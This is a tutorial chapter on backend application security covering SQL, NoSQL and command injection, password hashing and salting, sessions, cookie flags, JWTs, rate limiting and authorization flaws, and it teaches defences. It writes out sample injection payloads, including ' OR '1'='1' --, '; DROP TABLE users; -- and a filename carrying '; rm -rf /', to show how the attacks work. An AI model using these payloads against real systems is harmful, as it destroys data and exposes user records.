# Security for Backend Systems

## Overview

Security is one of the most important things you as a backend engineer should be aware of. Unlike other topics in backend engineering, security is something that — if you don't pay close attention to — has deeply destructive effects on your application. Destructive financially, destructive to your business, destructive to your resources. Everything ultimately boils down to money and finance.

Security itself is a vast domain. Depending on the context, you can talk about:

- **Browser security** — covering HTML, cookies, local storage, and the various vulnerabilities that can arise from them
- **Network security** — covering the transport layer: HTTP, HTTPS, encryption, and compression
- **Server security** — not just your application code, but the operating system that hosts your process. When you deploy a backend application to a server, your code runs as a process inside an operating system, and that operating system itself has its own security context
- **Backend application security** — vulnerabilities that arise specifically because of the code you have written

If you try to tackle all of these simultaneously, it quickly goes out of scope. But this chapter focuses specifically on backend application security — the vulnerabilities that backend engineers are most directly responsible for.

### The Goal of This Chapter

The goal here is not to teach you every fancy security technique so that you can implement all of them starting tomorrow. That is not going to happen in a single chapter. Security is a vast domain and requires a lot of reading and research on your part.

The real goal is to **make you paranoid about your application** — to give you a mindset where you always keep security at the back of your head, every time you write code. You want to constantly be asking: *what could go wrong here, in terms of security?*

That mental model — that habit of questioning assumptions — is what will stick with you regardless of which language or framework you use. Whether it is Go, Python, Node.js, or Rust, the mindset remains the same.

---

## Thinking Like an Attacker

Instead of listing abstract vulnerabilities, it is more effective to understand how attackers actually think. The word "hacker" carries a lot of cringe associations, so let's use the word **attacker** — someone who wishes harm upon your application in any way possible.

Attackers don't care about your framework, your library, or your programming language. They care about one question:

> **Where did the developer make an assumption?**

That is the single most important question in security. And every vulnerability we will discuss comes down to exactly that. A developer assumed that:

- The input coming from the user would be clean
- The user was who they said they were
- The request arriving at their server was coming from their own frontend
- No one would open the network tab and inspect or modify requests

These assumptions feel perfectly reasonable when you are building under a deadline — especially in startups where you always want to ship features as fast as possible. In that environment, you are always thinking in the **happy path**: the user will fill the form correctly, click the right buttons, and navigate the app exactly as intended.

But attackers don't use your app the way you designed it. They poke at every single boundary. They try to modify, break, and manipulate every input. They try to guess every assumption you have made.

By the end of this chapter, you will have a mental model that makes you automatically ask *what could go wrong here?* every time you write code.

---

## Injection Attacks

### What Is an Injection Attack?

Injection attacks have been around for decades. They are still extremely common, and they all share the same root cause. Once you understand that root cause, you will understand an entire category of vulnerabilities.

The fundamental truth is this: **your application speaks multiple languages simultaneously.**

Imagine your backend application sitting at the center of an ecosystem:

- It talks to a **database** — using the language SQL
- It talks to a **browser** — using HTML, CSS, and JavaScript
- It talks to an **operating system** — using shell commands

Each one of these languages has its own grammar, its own set of special characters, and its own way of separating commands from data.

Vulnerabilities arise when **a user speaking one language tries to cross the boundary into another language**. The user typically interacts through the browser using HTML and JavaScript. When that user's input travels into the SQL boundary or the shell boundary, characters that were harmless in one language may carry special meaning in another. This confusion between languages is the root cause of most injection-based attacks.

---

### SQL Injection

SQL injection is one of the most dangerous and most common injection attacks. Let's walk through it with a concrete example.

#### The Setup

Imagine a simple login page with an email field and a password field. This frontend talks to a backend server, which in turn queries a database to verify credentials. The server receives the email and password, builds a database query to find the user, checks whether the password matches, and returns a response.

Let's zoom in on what that database query looks like. A typical query might be:

```sql
SELECT * FROM users WHERE email = '<user_input>'
```

If the developer builds this query by **concatenating strings** — taking a query template and dropping the raw user input directly inside it — there is a serious problem.

#### The Happy Path

In the happy path, the user types their email address, say `alice@gmail.com`. The server takes that input and inserts it into the query:

```sql
SELECT * FROM users WHERE email = 'alice@gmail.com'
```

The database finds the user, returns the row, and the login succeeds. Simple and clean.

#### The Attack

Now imagine an attacker, instead of typing a valid email, types something like:

```
' OR '1'='1' --
```

The server takes this input and inserts it into the same query template, producing:

```sql
SELECT * FROM users WHERE email = '' OR '1'='1' --'
```

Let's break down what happened:

- The attacker's first character is a single quote `'`, which **closes** the opening quote that the server already inserted. This turns `email = '` into `email = ''` — an empty string condition
- Next comes `OR '1'='1'` — since one part of an OR condition is always true (`'1' equals '1'`), the **entire WHERE clause becomes true**
- The double hyphen `--` at the end **comments out** the rest of the original query, including the closing quote, preventing any syntax error

The final query is effectively equivalent to:

```sql
SELECT * FROM users
```

Which returns **every single user in the database** — including their email addresses, hashed passwords, phone numbers, addresses, and any other sensitive fields — without the attacker providing a valid email at all.

#### Making It More Destructive

The same technique can be used to do far more damage. Instead of extracting data, an attacker could craft an input like:

```
'; DROP TABLE users; --
```

Which produces:

```sql
SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
```

When executed, this completely **deletes your users table** from the database. Depending on the database driver and its configuration, this may or may not execute. Modern drivers often block back-to-back SQL statements by default, which is why you should always use up-to-date database drivers. But on older or unprotected drivers, this works exactly as the attacker intended.

An attacker with the right skills and intentions can go even further — using `UNION` statements to extract data from other tables like payment information, using database-specific functions to read files from your server's filesystem, or in some configurations, even executing operating system commands through the database.

This is why SQL injection has been one of the most destructive vulnerabilities for decades.

#### The Root Cause

Going back to our mental model of languages crossing boundaries: SQL is a language where certain characters carry special meaning.

- Single quote `'` — denotes a string
- Semicolon `;` — separates two statements
- Double hyphen `--` — starts a comment; everything after it is ignored
- Keywords like `OR`, `DROP`, `WHERE` — have specific execution meaning

When you concatenate a SQL template with raw user input, you are **trusting that the user's input contains none of these special characters** — which is an impossible guarantee. Even a benign user might accidentally type special characters. You are treating data as if it cannot possibly contain anything that SQL would interpret as code. And that is the essence of all injection attacks: **the confusion between code and data** — treating data as code.

---

### Parameterized Queries (The Fix for SQL Injection)

The solution to SQL injection is **parameterized queries**, also called **prepared statements**.

Instead of building a single concatenated string like:

```sql
SELECT * FROM users WHERE email = '<user_input>'
```

You write a query template with a **slot** (a parameter placeholder) and pass the user's input separately:

```javascript
const statement = `SELECT * FROM users WHERE email = $1`;
db.query(statement, [userInput]);
```

The key idea is to **send two separate things to the database**:

1. The query structure — the template with no user data embedded in it
2. The user data — passed as a separate argument

When the database constructs the final query by filling in the slot, it treats whatever goes into the slot as **pure data**. There is no confusion between code and data. The database does not attempt to interpret the user's input as SQL syntax.

So if an attacker passes `' OR '1'='1' --`, the database treats that entire string as a literal email value — clearly not a match for anything in the database, and completely harmless. The single quotes, the `OR`, the double hyphen — none of it carries any SQL meaning. It is just a garbage string that won't find any matching user.

> **Note:** Your validation layer should have already rejected that string as a non-valid email format before it even reached the database query. But parameterized queries are your last line of defense even if validation is weak.

Today, every database driver in every language supports parameterized queries. Every ORM also uses them by default. The only way to remain vulnerable is to **deliberately bypass all safety mechanisms** by building raw query strings yourself through string concatenation — which is both insecure and less convenient. Always use parameterized queries.

---

### NoSQL Injection

Some developers think: "I use MongoDB, not SQL, so I don't write SQL — I'm safe." That is not true.

In MongoDB, queries are represented as JSON-like objects. A typical find-by-email query might look like:

```javascript
db.users.find({ email: userInput });
```

MongoDB query objects can contain **operators** — things like the not-equal operator, the greater-than operator, the exists operator — specified as nested objects with special keys starting with `$`.

If an attacker can control not just the value but the **structure** of the query object, they can inject these operators. For example, instead of a string value, they can pass an object with a `$ne` (not equal) operator, which completely changes the semantics of the query.

So even if you use a NoSQL database, you need to validate and sanitize user input to ensure that a user cannot inject operators into your query structure.

---

### Command Injection

Command injection works on the same principle as SQL injection, but the target is your **operating system** instead of your database.

#### The Setup

Imagine a web application where users can upload images. Your server needs to process those images — say, to compress or resize them. To do this, you use a command-line tool like `ffmpeg`, calling it from your backend code:

```bash
ffmpeg -height 120 -width 220 -o <user_provided_filename>
```

The output filename is provided by the user. If you take that value and concatenate it directly into your shell command, you have a problem.

#### The Attack

If the user provides something like:

```
output.jpg; rm -rf /
```

The full command becomes:

```bash
ffmpeg -height 120 -width 220 -o output.jpg; rm -rf /
```

The shell sees the semicolon as a statement separator. The first command (`ffmpeg`) runs normally. Then `rm -rf /` executes — **deleting your entire root filesystem**.

An attacker can get creative using pipes to redirect output to destructive commands, or using ampersands to run spyware in the background. Each shell — Bash, Zsh, Fish — has its own special characters and escape sequences that an experienced attacker can exploit.

#### The Fix

The fix is the same conceptual approach as parameterized queries: **separate the command from its arguments**.

Most languages provide functions that accept the command and its arguments as separate parameters, passing the arguments directly to the process without going through the shell interpreter:

```javascript
// Instead of this (dangerous):
exec(`ffmpeg -o ${userInput}`);

// Do this (safe):
execFile('ffmpeg', ['-o', userInput]);
```

When the user's input is passed directly to the process as a separate argument, it is treated purely as a string — not interpreted by the shell. The semicolons, pipes, and ampersands carry no special meaning at the process level. Command injection becomes impossible.

---

### The Injection Attack Mental Model

This mental model applies to virtually all injection attacks:

Whenever you pass user input — whatever a user types or pastes — into another system (a database, an operating system, an XML parser, an LDAP directory), you must ensure that the user input is treated **purely as data**. It should never be executable or interpretable as code.

The safest way to guarantee this is to use APIs, functions, and methods that allow you to **separate the structure from the data** — separate code from data. In SQL, that is parameterized queries. In shell commands, that is argument arrays.

**What you should never do** is perform these sensitive operations using string concatenation or template strings that mix user input with control syntax.

> **The paranoia trigger:** Whenever you are building a string that will be interpreted by another system, and that string includes any kind of user input, stop and think. Always look for a parameterized alternative. One almost always exists.

---

## Authentication Security

We have already covered authentication and authorization in depth in a separate chapter. In this section, we look at authentication through the lens of security vulnerabilities — where the weaknesses are, and where engineers typically go wrong.

### What Is Authentication?

Authentication is the process of **verifying the identity of your user** — answering the question: which row in your `users` table corresponds to the person who is currently trying to access your system?

If you get authentication wrong, a malicious actor can:

- Impersonate your users
- Access their private data
- Take actions on their behalf
- Steal their money if you deal with payment operations

Account takeover vulnerabilities happen in the real world every single day.

---

### Should You Implement Authentication Yourself?

Before diving into technical details, here is an important piece of advice: **if you can avoid implementing authentication yourself, you should.**

This doesn't mean avoiding implementing your own cryptographic algorithms — it means avoiding implementing the entire authentication flow in production systems when a dedicated authentication provider is available.

#### Why Use an Auth Provider?

If you think about everything that goes into a production-grade authentication system, the scope is much larger than a simple JWT sign-and-verify flow:

**Stateful authentication** — In production, you generally want to track all the devices where a user is currently logged in, and allow either the user or you (as the service provider) to immediately revoke sessions across all devices at once. This requires databases, caches like Redis, careful thinking about where to store user permissions, timeout logic, and revocation mechanisms across both cache and database layers.

**Social authentication (OAuth flows)** — Most production SaaS services offer "Sign in with Google", "Sign in with GitHub", "Sign in with Twitter". Each of these requires implementing an OAuth flow in both your backend and frontend, with proper redirect handling for a smooth user experience.

**Linking accounts** — Imagine a user who signed up with `user@gmail.com` as their email and password. Later they try to sign in with Google using the same email. Your system needs to be smart enough to link these two authentication methods to the same user account — not treat them as two separate users just because they used different sign-in methods.

Each of these is a week of developer time if you are doing it carefully. If you cut corners, you compromise either security or user experience, or both.

#### The Recommendation

Use an auth provider. Modern providers like Clerk handle all of this — stateful auth, social auth, advanced security, RBAC permissions — with just an API key and a few buttons. They have dedicated security teams thinking about vulnerabilities 24/7. They respond to new attack vectors faster than a product team ever could.

Yes, as your user base scales to hundreds of thousands or millions, the monthly invoice from your auth provider may reach thousands of dollars. But by then, you will have the revenue to support it, and the developer bandwidth to consider migrating to your own implementation.

**The recommended approach:**

- Start with an auth provider
- When scale and revenue justify it, evaluate migrating to your own solution

Even if you follow this advice and use an auth provider, you still need to understand how authentication works — how to configure it, what can go wrong, and how to integrate it securely.

---

### Password Storage

Let's start with passwords, since most systems deal with them even when using an auth provider.

During sign-up, a user provides an email and a password. Your server receives them. The question is: **how do you store the password so you can verify it later during login?**

#### The Naive Approach: Plain Text

The naive approach is to store the password exactly as the user typed it — as plain text in a database column.

The login flow then becomes:
1. User sends email and password
2. Server fetches the stored password for that email from the database
3. Server compares them — if they match, login succeeds

Simple. But deeply wrong.

**Why plain text storage is dangerous:**

Databases get breached every single day. If you follow tech or cybersecurity news, you see headlines constantly: "This company's database was breached; user credentials leaked." It happens to companies of all sizes — not just small startups, and not just large enterprises. Breaches happen for many reasons: an insider employee acting maliciously, a third-party service getting compromised and taking you down with it, a vulnerability in your infrastructure.

When your database gets breached and you store passwords in plain text:

- Every user's password is immediately exposed
- You can force a password reset, but **more than 70% of internet users reuse the same email and password combination across multiple sites**
- The attacker takes your leaked credentials and runs them against payment sites, e-commerce platforms, social media — a practice called **credential stuffing**
- There is a high probability of successfully taking over accounts on other platforms
- Most users won't even know your database was breached unless they closely follow tech news

Beyond breaches, plain text storage also means **every developer, every database administrator, every contractor with database access can read every user's password.** You are trusting your entire team with your users' entire online presence.

#### The Right Approach: Hashing

The solution is **hashing**. A hashing function is:

- **One-way** — you cannot derive the input from the output; it is mathematically infeasible with current computing power
- **Deterministic** — the same input always produces the same output
- **Fixed-length output** — regardless of the length of the input, the output is always a fixed number of characters

For example, a password of `12345` passed through a hashing function produces a long string of fixed-length characters. A password of `password123456789abcdefghijklmnop` (much longer) produces a different output but of the same fixed length.

**The hashed password storage flow:**

1. User signs up with password `12345`
2. Server runs it through a hashing function (e.g., bcrypt): `12345` → `$2b$10$...` (a long hash)
3. The hash — not the original password — is stored in the database

**The login verification flow:**

1. User submits their password during login
2. Server fetches the stored hash for that user from the database
3. Server hashes the submitted password using the same algorithm
4. Server compares the two hashes — if they match, the password is correct

**Why this is safer in a breach:**

When the attacker gets access to the database, they only get the hashes — not the actual passwords. Since hashing is one-way, they cannot reverse-engineer the original passwords from the hashes. The user's actual credentials are never exposed.

# Security for Backend Systems — Part 2

## Rainbow Table Attacks and Salting

So far we have established that hashing is the right approach for storing passwords in a database. But does hashing alone make us completely safe? Unfortunately, no.

Since hashing has become the industry standard for password storage, attackers are fully aware of this too. And what they have done in response is build enormous pre-computed databases called **rainbow tables**.

### What Is a Rainbow Table?

A rainbow table is essentially a giant lookup table — a one-to-one map of common passwords and their corresponding hashes. For example:

- The password `12345` → its hash using a popular algorithm
- The password `password` → its hash
- The password `password@123` → its hash

If you do a simple Google search, you can find images of rainbow tables where common passwords are listed on the left and their hashes on the right. Since there are industry-standard hashing algorithms that most of the web uses (like bcrypt or SHA-256), attackers can pre-compute the hashes of millions of common passwords using those exact algorithms and store all of them in this lookup table.

### The Attack

When your database gets breached — and even though you stored hashed passwords instead of plain text, feeling confident that you are safe — the attacker runs your leaked hashes against their rainbow table. Since a significant percentage of users use common passwords like `password`, `12345`, or `password@123`, there is a high probability that some of your users' hashes will match an entry in the rainbow table. And since a hash function always returns the same output for the same input, the attacker can **reverse-map** the hash back to the original password.

This is why hashing alone is still not enough.

---

### The Fix: Salting

The solution to rainbow table attacks is **salting**. Salting is a simple but powerful technique that eliminates the "sameness" problem — the fact that the same password always produces the same hash.

Here is how it works:

When a user signs up with a password like `12345`, instead of just hashing the password directly, you first **generate a random string unique to that user** — this is called the salt. You then concatenate the password with the salt and hash the combined string. Whatever hash comes out of that is what gets stored in your database, along with the salt itself.

Your database row for that user now has:
- `name`
- `email`
- `hashed_password` (the hash of `password + salt`)
- `salt` (the randomly generated string, stored in plain text)

The salt must be generated using a **cryptographically secure pseudo-random number generator** — libraries like OpenSSL provide these functions.

#### Why Salting Defeats Rainbow Tables

Now when the attacker breaches your database and runs your hashed passwords against their rainbow table, they get **zero matches**. This is because every user's hash was computed using a different random salt. The hash of `12345` + `SP3xyz9q` (user 14's salt) will never appear in any pre-computed rainbow table in the world. It doesn't matter that the user's actual password is a common one. The salt makes every hash globally unique.

Even though the attacker gets both the hashed password and the salt from the breach, the rainbow table is completely useless against salted hashes.

---

## Brute Force Attacks and Slow Hashing Functions

With hashing and salting in place, are we finally safe? Still not entirely. The next threat is **offline brute force attacks**.

With the rise of GPUs — now widely available even through cloud providers — modern graphics cards are extremely fast at computing hashes. A single GPU can compute **billions of SHA-256 hashes per second**. So even with salting, an attacker who has your database can perform an offline brute force attack. They take a user's salt, try common passwords one by one, hash each guess combined with the salt, and compare the result against the stored hash. At billions of attempts per second, they can try every password up to eight characters, every common password pattern, and every word with common substitutions — **within a matter of days**.

### The Fix: Slow Hashing Functions

The solution is to not use general-purpose hash functions like SHA-256 or MD5 for password hashing. These were designed for speed — useful for things like file integrity verification, but completely wrong for password storage.

Instead, we use **slow hashing functions** specifically designed for password hashing:

- **bcrypt** — has been the default standard for most web applications for a long time
- **scrypt** — another slow hashing function
- **Argon2id** — the current industry standard, considered the most secure and most performant option for password hashing

These slow hashing algorithms have a special property called a **cost factor** (also called a **work factor**) which lets you control exactly how slow you want the hashing to be, based on your system's computing capability and the latency you can afford.

#### The Key Insight: Asymmetric Cost

If you configure your hashing to take, say, 400 milliseconds:

- For a **genuine user** logging in through their browser, a 400–600ms login delay is almost imperceptible. They barely notice it.
- For an **attacker** who was previously computing billions of hashes per second offline, that same cost factor drops their throughput to just **4 or 5 attempts per second**.

Instead of cracking passwords in a matter of days, it would now take them **decades or even centuries**. The asymmetry is the point — the cost is negligible to a real user, but catastrophic to a brute-force attack.

> **Resource:** A good place to read about current authentication best practices and industry standards is [Lucia Auth](https://lucia-auth.com). Lucia was previously an authentication library but is now a guidance resource for implementing your own secure authentication using the best practices — well worth exploring.

---

## Session Management

Your user has successfully logged in. Their identity is verified. But we obviously cannot ask them to re-enter their password for every subsequent request — that would be a terrible user experience. This is where **sessions** come in.

### How Sessions Work

When a user successfully logs in, the server performs three things:

**1. Generate a random session identifier**

The server generates a long random string — ideally between 128 to 256 characters — using a cryptographically secure pseudo-random number generator. This is critical: if an attacker can guess a session ID, they can hijack any user's session. At 128 bits, the number of possible session IDs exceeds the number of atoms in the observable universe, making guessing practically impossible.

**2. Store the session identifier in a persistent store**

The server stores the session ID in either Redis (which provides very fast read/write times and improves user experience) or a primary database like PostgreSQL or MySQL. Along with the session ID, the server stores metadata such as:

- Which user this session belongs to
- When it was created
- When it will expire (e.g., a default of 7 days)
- The user's IP address (so the user's dashboard can show active login locations)
- The user agent — the request header that tells the server what browser or device the user is on (Chrome, Firefox, Android, iPhone, etc.)

**3. Send the session ID to the browser via a cookie**

The server sends the session identifier to the browser and instructs it to store it in a cookie. From this point forward, every subsequent request the browser makes automatically includes this cookie. The server extracts the session ID from the cookie, looks it up in the persistent store, finds the associated user, and knows exactly who is making the request.

---

## Cookie Security Flags

When storing a session identifier (or any authentication token) in a cookie, there are three critical flags you must always configure in production systems.

### 1. `HttpOnly`

Setting `HttpOnly` to `true` ensures that JavaScript **cannot access this cookie**. This is crucial because if your site has an XSS (Cross-Site Scripting) vulnerability — where an attacker is able to run malicious JavaScript in your user's browser — that script could read cookies and steal session IDs. With `HttpOnly` enabled, even if XSS is present, the malicious script cannot read the authentication cookie.

This is also why storing session identifiers or JWT tokens in `localStorage` is always discouraged — `localStorage` is fully accessible to any JavaScript snippet running on the page.

### 2. `Secure`

Setting `Secure` to `true` instructs the browser to only send this cookie **over HTTPS connections** — never over plain HTTP.

HTTP traffic can be intercepted on public networks: public Wi-Fi at cafes, malicious ISPs, or compromised routers running traffic-inspection spyware. Tools like Wireshark make it trivial to observe unencrypted HTTP traffic. If your authentication cookie travels over HTTP, it can be stolen by anyone monitoring that network hop. The `Secure` flag ensures the cookie only moves over encrypted HTTPS connections, where even an observer can't make sense of the traffic.

### 3. `SameSite`

The `SameSite` flag controls whether the cookie is sent during **cross-origin requests**. It has three possible values:

- **`Strict`** — The cookie is only sent if the request originates from your own site. If a user clicks a link to your site from some other website, the cookie will not be included. This is the most restrictive and most secure option.
- **`Lax`** — The cookie is sent for top-level navigation requests (e.g., a direct link to your site) but not for sub-resource requests like images or iframes embedded on other sites. This protects against a class of attacks called CSRF (Cross-Site Request Forgery), which we will cover later.
- **`None`** — The cookie is sent for all kinds of requests, including cross-origin ones. If you use `None`, the `Secure` flag must also be set. This is the most permissive setting and should be avoided for authentication cookies.

For storing session IDs or auth tokens, you either want `Strict` (best case) or `Lax`. Never use `None` for authentication cookies.

---

## JWT and Stateless Authentication

An alternative to stateful sessions is **JSON Web Tokens (JWTs)** — a stateless authentication approach.

### Sessions vs. JWTs: The Core Difference

With sessions, the server stores all session data (user info, IP, user agent, expiry) in the database and sends just the session ID to the client. Every request, the server fetches the full session from the database using that ID.

With JWTs, the server sends the **entire session data** to the client, encoded and signed as a token. The client stores this token and sends it back with every request. The server never needs to look anything up in a database.

### Structure of a JWT

A JWT has three parts, each base64-encoded and separated by dots:

**1. Header** — describes the token type and the signing algorithm used.

**2. Payload** — contains **claims**: key-value pairs of information stored inside the token. Standard claims include:
- `sub` (subject) — the user's ID in your platform (UUID or any other ID format)
- `iat` (issued at) — the timestamp when the token was created, used to calculate expiry

You can also add **custom claims** beyond the defaults — for example, the user's name or whether they are an admin.

**3. Signature** — the server takes the header and payload, and signs them together using a secret key stored in an environment variable. Whatever the result is, that becomes the signature — the final part of the JWT.

### The JWT Login Flow

1. User sends email and password
2. Server verifies credentials (same hashing and salting as before — that part doesn't change)
3. Server creates a JWT with the user's ID, relevant claims, and the issued-at timestamp
4. Server signs the payload with a secret key from its environment variables
5. The signed JWT is sent to the client for storage
6. For every subsequent request, the client sends the JWT back in the `Authorization` header
7. The server extracts and verifies the JWT using the same secret key
8. If the signature is valid, the server knows the payload has not been tampered with and trusts the claims

### Why You Can't Tamper with the Payload

The payload is just a base64-encoded string — anyone can decode it and read its contents. But if you try to modify the payload and re-encode it, the signature verification immediately fails. The server uses the secret key to verify that the header + payload combination matches the signature. Any modification — even changing one character in the payload — produces a different hash that won't match the original signature. The server will reject the request.

**Important implication:** Because the payload is readable (just base64, not encrypted), **never store sensitive information in a JWT payload**. Only store information that is helpful to your server and harmless if exposed — like user ID, role, or name.

### The Big Advantage of JWTs

The server doesn't need to store anything in a database. Everything is verified on the fly by checking the token's signature. This makes JWTs easier to scale horizontally, since multiple servers can verify the same token without a shared database session store.

---

### The Problems with JWTs

#### 1. Revocation Is Hard

With sessions, revoking a user's session is simple: delete the session row from the database. The next request the user makes, the session ID won't be found, and they'll be logged out immediately.

With JWTs, you **cannot just delete a token from the client**. The token lives on the client side. If a user's account is compromised and they contact support asking you to log them out of all devices immediately, you are in a difficult spot — stateless authentication gives you no mechanism to revoke a token server-side.

The community has developed two workarounds:

**Blocklisted tokens** — When a token needs to be revoked, you store that specific token in a blocklist in your database or Redis cache. On every request, you check if the incoming token is in the blocklist and reject it if so. This works, but it partly reintroduces the database lookup you were trying to avoid with JWTs in the first place.

**Short expiry with refresh tokens** — Instead of issuing one long-lived token after login, issue two:

- An **access token** with a very short expiry (5–10 minutes)
- A **refresh token** with a longer expiry (1 day to 7 days)

For every request, the client sends the access token. When the access token expires, the server returns a `401 Unauthorized`. The client then uses the refresh token to request a new access token and a new refresh token. The cycle continues.

If the account is compromised and an attacker gets hold of the access token, the window of damage is only 5–10 minutes. Even if they get the refresh token, it expires within a day. These are not perfect solutions, but they are the accepted workarounds in the industry.

#### 2. JWT Storage on the Client

Where should the client store the JWT?

- **`localStorage`** — most commonly used, but vulnerable to XSS attacks since any JavaScript snippet can read it
- **`HttpOnly` cookies** — prevents JavaScript from accessing the token, but brings you back to a cookie-based solution — essentially the same as sessions

When you reach the JWT storage problem and work through the solutions, you often end up back at `HttpOnly` cookies. Which raises the question of whether JWTs were worth the complexity to begin with.

### Stateless vs. Stateful: The Recommendation

Unless you have specific horizontal scaling requirements where multiple servers need to authenticate a particular user's request simultaneously, **always prefer stateful authentication (sessions)**.

Even if you do have scaling requirements, you can use a distributed key-value store like Redis to share session state across multiple servers — solving the scaling problem without the complexity and limitations of JWTs.

The tradeoffs of stateless authentication are simply not worth it for most SaaS projects. Session-based authentication is simpler, revocation is straightforward, and the architecture is compatible with the vast majority of production systems.

**If you do use JWTs:**
- Always use short expiration times — minutes to hours, never days
- Implement refresh token flows with server-side storage
- Always use `HttpOnly` cookies rather than `localStorage`

---

## Rate Limiting for Authentication

Rate limiting is a mandatory security mechanism for any authentication system.

Without rate limiting, an attacker can send thousands or millions of requests per second to your authentication endpoint, trying different combinations of usernames and passwords. Two bad outcomes follow: either they eventually find a valid credential match and take over a user's account, or they send so much traffic that your server crashes under the load. Both are bad.

Rate limiting should be configured more strictly for authentication endpoints than for general service endpoints.

### A Layered Rate Limiting Strategy

A single rate limiting mechanism is often not enough for authentication. A layered approach is recommended.

**Layer 1: Per-IP Rate Limiting**

Limit how many login attempts can come from a single IP address in a given time window — for example, 10 attempts per minute. This stops most automated attacks.

However, per-IP limiting has weaknesses:
- In universities or large organizations, many users share the same outgoing IP address (they all route through the same gateway), so you might accidentally block legitimate users
- Sophisticated attackers use botnets, proxy networks, VPNs, or rotating IPs — easily bypassing per-IP limits

**Layer 2: Per-Account Locking**

Limit how many failed login attempts can happen for a single account — for example, 5 failures in 15 minutes triggers a 24-hour account lock, requiring the user to contact support. This stops IP-rotating attacks targeting a specific account.

However, this also has a weakness: attackers can try **one password across many accounts** — one attempt at account A, one at account B, and so on. Since no single account accumulates too many failures, per-account locking doesn't trigger. And since they're rotating IPs, per-IP limiting doesn't trigger either.

**Layer 3: Global Rate Limiting**

Limit how many total login attempts (especially failed ones) your entire system accepts in a given time frame — for example, a maximum of 100 failed login attempts per minute across the whole platform. The moment an attacker's attempts push past this global threshold, your system raises an alert. You can then:

- Block all the flagged IP addresses
- Show CAPTCHAs to all users to filter genuine users from automated bots
- Actively investigate and respond to the incident

Using all three layers together prevents both individual account takeovers through brute force and server crashes from volumetric attacks.

---

## Authorization Security

Authentication answers "who are you?" Authorization answers "what are you allowed to do?" While authentication identifies the user — which row in the users table corresponds to this person — authorization determines what permissions that user has in your system.

The security vulnerabilities in authorization don't usually arise from confusing the definitions. Engineers know the difference. The vulnerabilities arise in **technical implementation** — specifically in the gap between where authorization is checked and where data is actually accessed.

### The Architecture Context

A typical backend request flows through:

```
Routing Layer → Handler → Service Layer → Repository Layer (DB)
```

Authentication middleware sits at the routing layer and verifies the session or JWT. Additional authorization checks also happen at the routing layer — checking if the user has a specific role (member, admin) or a granular permission (read:books, write:books).

Once the user passes these checks and the request reaches the service and repository layers, **engineers often stop checking authorization entirely**. This is where most authorization vulnerabilities are born.

---

### Broken Object Level Authorization (BOLA)

Also known as **Insecure Direct Object Reference (IDOR)**, this vulnerability occurs when your system checks authentication and coarse-grained authorization at the routing layer, but **fails to verify at the database level that the user actually owns or has access to the specific object they are requesting**.

#### The Scenario

A user sees a list of books with filters on the frontend. They select book ID `5` and the frontend calls `GET /books?id=5`. At the routing layer, we verify the user is authenticated and has `read:books` permission. We then run:

```sql
SELECT * FROM books WHERE id = 5
```

And return the result. 

The problem: **book ID 5 does not belong to this user**. We never checked that. Just because the user passed the authentication check and has the `read:books` permission doesn't mean they have access to *all* books. The missing check was:

```sql
SELECT * FROM books WHERE id = 5 AND user_id = <context.userId>
```

#### The Danger

With a script, an attacker can iterate through all possible book or invoice IDs in your system, downloading every record they shouldn't have access to — financial data, sensitive documents, payment information. They can also tamper with records they shouldn't be able to modify.

#### The Fix

**At the database layer**, always include a `user_id` condition in your queries that matches the authenticated user's ID from the request context. Don't just fetch the resource by its ID — fetch it by its ID AND its owner. This check must happen for every database operation: SELECT, UPDATE, DELETE, and INSERT.

---

### Avoiding Information Leakage: 404 vs. 403

This is a subtle but important mistake seen in many real-world systems. When a user requests a resource they don't own, some engineers do this:

1. Fetch the resource from the database
2. Check if `context.userId === resource.userId`
3. If not, return `403 Forbidden`

This is technically "correct" — but it leaks information. By returning `403 Forbidden`, you are confirming to the attacker that **this resource exists in your system**. Even though they can't access it, they now know the resource ID is valid. An attacker can iterate through IDs, collect all the ones that return `403` (resource exists but forbidden), and build a list for a follow-up attack — such as social engineering, where they trick a human into revealing details.

**The better approach:** Instead of two queries (fetch, then check ownership), write one query:

```sql
SELECT * FROM invoices WHERE id = 7 AND user_id = <context.userId>
```

If the invoice doesn't belong to the user (or doesn't exist), **zero rows are returned**. Return `404 Not Found`. Now the attacker cannot distinguish between "this invoice doesn't exist" and "this invoice exists but belongs to someone else." The information leakage is eliminated entirely.

---

### Broken Function Level Authorization (BFLA)

This vulnerability is similar to BOLA but targets **functions** (endpoints) rather than data objects. It is specifically about users accessing sensitive functions that should only be available to admins.

#### The Scenario

Your system has an admin endpoint `GET /admin/invoices` that returns all invoices in the system. A regular user who logs in normally is also a platform user with a valid session. If there is no role-based check at the routing layer — just authentication — then any logged-in user can call this endpoint and retrieve every invoice in your system.

A common mistake here is relying on **security through obscurity** — not sharing the admin URL publicly, assuming no one will find it. This is a false sense of security. Anyone monitoring network traffic, or a curious developer, can discover the URL and call it directly.

#### The Fix

At the routing layer, add a **role-based middleware** in addition to the authentication middleware. The authentication middleware verifies the user is logged in. The role middleware verifies the user has the `admin` role. Only then is the request allowed to proceed to the handler. The `read:invoices` permission alone is not sufficient — the role must also be checked.

---

### Insecure Direct Object References and Sequential IDs

Using sequential integer IDs (e.g., `101`, `102`, `103`) in your API URLs like `GET /invoices/102` makes it trivially easy for attackers to enumerate all resources. Since IDs are predictable, an attacker can guess that `101` and `103` also exist and plan attacks accordingly.

**The fix:** Use **UUIDs** as your primary keys. A UUID looks like `550e8400-e29b-41d4-a716-446655440000` — randomly generated, unpredictable, and URL-friendly. Even if an attacker knows the URL pattern, they cannot guess valid UUIDs.

Note that UUIDs do come with some performance trade-offs in database indexing — worth reading about before adopting them.

---

### Authorization Attack Categories: A Mental Model

All authorization vulnerabilities fall into two categories:

**Horizontal authorization attacks** — User A gains access to resources belonging to User B. The scope widens *across* users at the same privilege level. BOLA / IDOR falls into this category. The attacker doesn't gain higher privileges, just access to data they shouldn't have.

**Vertical authorization attacks** — A regular user gains access to functions or data that require elevated privileges (e.g., admin functions). The scope widens *upward* in the privilege hierarchy. BFLA falls into this category.

---

### Framework for Preventing Authorization Vulnerabilities

**1. Centralize your authorization logic**

Don't scatter authorization checks throughout your codebase. When checks are spread across handlers, services, and repositories, they get applied inconsistently and are prone to being forgotten when new features are added. Create a clear, dedicated authorization layer that every request passes through.

**2. Default deny**

Your authorization logic should operate on the principle of **explicitly allowing** rather than explicitly denying. If your authorization logic does not explicitly grant access to something, that access should be denied by default. This means that when you add a new resource or endpoint, it is **protected by default** — even if you forget to add it to your authorization layer. Nothing is open until you deliberately open it.

**3. Test authorization explicitly with automated tests**

